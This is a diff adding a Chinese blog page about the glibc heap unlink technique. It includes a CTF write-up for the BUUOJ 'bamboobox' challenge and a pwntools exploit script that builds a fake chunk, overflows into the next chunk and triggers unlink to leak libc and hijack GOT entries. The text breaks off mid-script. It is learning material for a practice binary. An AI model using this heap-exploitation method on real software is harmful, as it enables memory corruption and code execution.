@@ -1,0 +1,656 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="堆,unlink" />
+
+
+<link rel="canonical" href="http://example.com/2023/08/11/unlink/">
+
+
+
+  <title>
+unlink - 技巧 - PWN的学习 |
+yhuanhuan =  = 不在能知，乃在能行</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">unlink
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-08-11 13:56:52">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-11T13:56:52+08:00">2023-08-11</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>3.9k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>4 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">yhuanhuan</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/n1j3BiVI9UMyxYf.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/PavyAqzTMBH8QjR.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/3QaAkKnrb4hzo58.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/KwJG42PtjmEyikW.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/xjtAgruqnc43m1Q.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/ibKkDqfNwIytXUL.png"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" itemprop="item" rel="index" title="分类于 PWN的学习"><span itemprop="name">PWN的学习</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" itemprop="item" rel="index" title="分类于 技巧"><span itemprop="name">技巧</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/11/unlink/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/huanhuan.png">
+    <meta itemprop="name" content="yhuanhuan">
+    <meta itemprop="description" content="不在能知，乃在能行, 欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="pwn_unlink了解学习"><a class="markdownIt-Anchor" href="#pwn_unlink了解学习">#</a> PWN_unlink 了解学习</h1>
+<h2 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理：</h2>
+<p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>
+<p><em>注意这里的是修改指针</em></p>
+<p>简单的介绍下 unlink，其实 ctfwiki 有介绍，这里简单介绍下：</p>
+<pre><code>1. 首先找到要进行unlink的chunk(这里记为P)的前后堆块，
+   FD = P-&gt;fd, BK = P-&gt;bk。
+	
+2. 进行安全检查，glibc2.23的潦草判断条件如下
+   FD-&gt;bk == P, BK-&gt;fd == P。
+   
+3. 然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。
+
+4. 当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink
+</code></pre>
+<p>这里就是我们需要构造 fake_chunk 去绕过检查，利用 unlink 漏洞，去达到我们想要达成的效果。</p>
+<ul>
+<li>利用 pwn unlink 漏洞可以实现以下攻击：</li>
+</ul>
+<ol>
+<li><strong>泄露内存</strong>：通过 unlink 漏洞，可以将两个相邻的堆块合并，导致一个已经释放的堆块中的指针被篡改。通过修改指针的值，可以泄露堆中的敏感信息，如函数指针、堆块头部数据等。</li>
+<li><strong>任意内存写</strong>：通过 unlink 漏洞，可以修改已经释放的堆块的前后指针，从而实现任意内存写。这可以用来修改关键数据结构，如堆块头部、全局变量等，进而控制程序的执行流程。</li>
+<li><strong>执行任意代码</strong>：通过泄露函数指针或修改返回地址等方式，可以篡改程序的控制流，从而实现代码执行。这可以用来执行恶意代码、获取系统权限等。</li>
+</ol>
+<blockquote>
+<p><img data-src="/img/unlinkpic/unlink_smallbin_intro.png" alt="img"></p>
+</blockquote>
+<blockquote>
+<p>利用思路 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18y">¶</span></p>
+<p>条件 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18z">¶</span></p>
+<ol>
+<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
+<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
+</ol>
+<p>效果 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI180">¶</span></p>
+<p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
+<p>思路 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI181">¶</span></p>
+<p>设指向可 UAF chunk 的指针的地址为 ptr</p>
+<ol>
+<li>修改 fd 为 ptr - 0x18</li>
+<li>修改 bk 为 ptr - 0x10</li>
+<li>触发 unlink</li>
+</ol>
+<p>ptr 处的指针会变为 ptr - 0x18。</p>
+<p>光讲原理，很枯燥乏味。上个题目，提提兴趣。</p>
+</blockquote>
+<h3 id="题目来源"><a class="markdownIt-Anchor" href="#题目来源">#</a> <span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2hpdGNvbnRyYWluaW5nX3VubGluaw==">题目来源：</span></h3>
+<h6 id="例行检查"><a class="markdownIt-Anchor" href="#例行检查">#</a> 例行检查：</h6>
+<p><img data-src="/img/unlinkpic/image-20230811115628259.png" alt="image-20230811115628259"></p>
+<h6 id="执行程序"><a class="markdownIt-Anchor" href="#执行程序">#</a> 执行程序：</h6>
+<p><img data-src="/img/unlinkpic/image-20230811115714589.png" alt="image-20230811115714589"></p>
+<blockquote>
+<p>给了个菜单，一共 5 个 node。这里就不一一执行了。</p>
+</blockquote>
+<h6 id="ida看源代码"><a class="markdownIt-Anchor" href="#ida看源代码">#</a> IDA 看源代码：</h6>
+<ul>
+<li>main:</li>
+</ul>
+<p><img data-src="/img/unlinkpic/image-20230811115907614.png" alt="image-20230811115907614"></p>
+<blockquote>
+<p>可以看到很多函数。这里简单讲一下吧。程序首先申请了 0x10 字节大小的堆空间。并将返回的指针赋予 v4 变量。将 v4 [0] 的函数指针指向 hello_message 内容，v4 [1] 的函数指针指向 goodbye_message 的内容。然后开头打印 v4 [0] 指向的内容。接着进行循环，每循环一次都会调用 menu 函数，并且输入一个不长于 8 字节的数字，然后将输入的数字转换成整数进行 switch 匹配。</p>
+</blockquote>
+<ul>
+<li>add_item:</li>
+</ul>
+<p><img data-src="/img/unlinkpic/image-20230811121510474.png" alt="image-20230811121510474"></p>
+<blockquote>
+<p>add 要求输入大小和内容。在这里可以很明显的发现一块 bss 段地址。因为 bss 段可以任意读写，所以可以通过 unlink 漏洞在 bss 段写入 got 地址，从而可以泄露 libc 地址</p>
+</blockquote>
+<ul>
+<li>remove_item:</li>
+</ul>
+<p><img data-src="/img/unlinkpic/image-20230811124741272.png" alt="image-20230811124741272"></p>
+<blockquote>
+<p>不存在 uaf 漏洞，但是可以利用 free 一个非 fastbins 大小的 chunk，去触发 unlink 漏洞。</p>
+</blockquote>
+<ul>
+<li>
+<p>change_item:</p>
+<p><img data-src="/img/unlinkpic/image-20230811124946810.png" alt="image-20230811124946810"></p>
+</li>
+</ul>
+<blockquote>
+<p>注释即使重点！</p>
+</blockquote>
+<ul>
+<li>
+<p>show_item:</p>
+<p><img data-src="/img/unlinkpic/image-20230811125058481.png" alt="image-20230811125058481"></p>
+</li>
+</ul>
+<blockquote>
+<p>利用这里的输出，可以去打印处 libc 地址</p>
+</blockquote>
+<h6 id="exp构造过程"><a class="markdownIt-Anchor" href="#exp构造过程">#</a> exp 构造过程：</h6>
+<figure class="highlight python"><figcaption data-lang="python"><span>n </span></figcaption><table><tr><td data-num="1"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token comment"># To stop merging chunk</span></pre></td></tr><tr><td data-num="4"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>首先 make chunk。</p>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre>ptr<span class="token operator">=</span><span class="token number">0x6020c8</span><span class="token comment">#指向 itemlist 内容</span></pre></td></tr><tr><td data-num="2"></td><td><pre>fd<span class="token operator">=</span>ptr<span class="token operator">-</span><span class="token number">0x18</span></pre></td></tr><tr><td data-num="3"></td><td><pre>bk<span class="token operator">=</span>ptr<span class="token operator">-</span><span class="token number">0x10</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>fake_chunk<span class="token operator">+=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span></pre></td></tr><tr><td data-num="10"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span><span class="token comment">#堆溢出，改写 chunk1 的头，为后续 unlink 触发。</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#触发 unlink, 使 chunk0 指向 itemlist 内容</span></pre></td></tr></table></figure><p>接下来就是泄露 libc，然后去覆盖 got 地址。执行 shell 函数。</p>
+<h6 id="最终的exp"><a class="markdownIt-Anchor" href="#最终的exp">#</a> 最终的 exp：</h6>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># r = remote('node4.buuoj.cn',25461)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># r = gdb.debug('./bamboobox')</span></pre></td></tr><tr><td data-num="6"></td><td><pre>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bamboobox'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bamboobox'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>lic 	<span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>pack    <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token builtin">str</span><span class="token punctuation">,</span> addr          <span class="token punctuation">:</span>p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>padding <span class="token operator">=</span> <span class="token keyword">lambda</span> lenth              <span class="token punctuation">:</span><span class="token string">b'Yhuan'</span><span class="token operator">*</span><span class="token punctuation">(</span>lenth<span class="token operator">//</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'Y'</span><span class="token operator">*</span><span class="token punctuation">(</span>lenth <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>it      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span> <span class="token string">b"1"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">def</span> <span class="token function">add_item</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter the name of item:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>length<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter the new name of the item:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter the index of item:"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>	sa<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">,</span><span class="token string">b'5'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token comment"># To stop merging chunk</span></pre></td></tr><tr><td data-num="57"></td><td><pre>add_item<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>ptr<span class="token operator">=</span><span class="token number">0x6020c8</span></pre></td></tr><tr><td data-num="60"></td><td><pre>fd<span class="token operator">=</span>ptr<span class="token operator">-</span><span class="token number">0x18</span></pre></td></tr><tr><td data-num="61"></td><td><pre>bk<span class="token operator">=</span>ptr<span class="token operator">-</span><span class="token number">0x10</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>fake_chunk<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>fake_chunk<span class="token operator">+=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span></pre></td></tr><tr><td data-num="68"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>fake_chunk<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre></pre></td></tr><tr><td data-num="73"></td><td><pre>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>free_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span></pre></td></tr><tr><td 